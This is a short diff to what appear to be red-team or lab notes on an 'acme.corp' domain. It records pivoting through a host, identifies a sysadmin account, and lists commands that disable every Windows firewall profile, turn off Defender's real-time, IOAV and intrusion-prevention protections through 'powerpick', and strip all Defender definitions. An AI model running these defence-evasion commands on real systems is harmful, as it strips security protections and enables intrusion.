@@ -20,3 +20,12 @@ acne.corp
 
 
 pivoted through host on pivot listener
+
+cotton is a sysadmin on domain
+
+can access web.acme.corp
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+
+powerpick Set-MPPreference -DisableRealTimeMonitoring $true -Verbose; Set-MPPreference -DisableIOAVProtection $true -Verbose; Set-MPPreference -DisableIntrusionPreventionSystem $true -Verbose
+
+remove all defnitions "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
